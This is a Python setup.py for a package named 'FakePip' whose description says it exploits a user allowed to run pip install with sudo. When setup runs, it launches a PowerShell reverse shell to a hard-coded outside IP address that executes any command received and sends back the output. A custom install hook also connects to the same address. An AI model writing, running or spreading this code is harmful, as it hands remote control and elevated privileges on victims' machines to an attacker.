from setuptools import setup
from setuptools.command.install import install
import base64
import os
import subprocess


powershell_cmd = r"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('154.213.177.40',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" """
# 运行命令
subprocess.run(powershell_cmd, shell=True)

class CustomInstall(install):
  def run(self):
    install.run(self)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(('154.213.177.40', 9000))
        s.sendall(b"GET / HTTP/1.1\r\nHost: 154.213.177.40:9000\r\n\r\n")
        s.close()
        print("[+] Success!")
    except Exception as e:
        print(f"[-] Error: {e}")


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
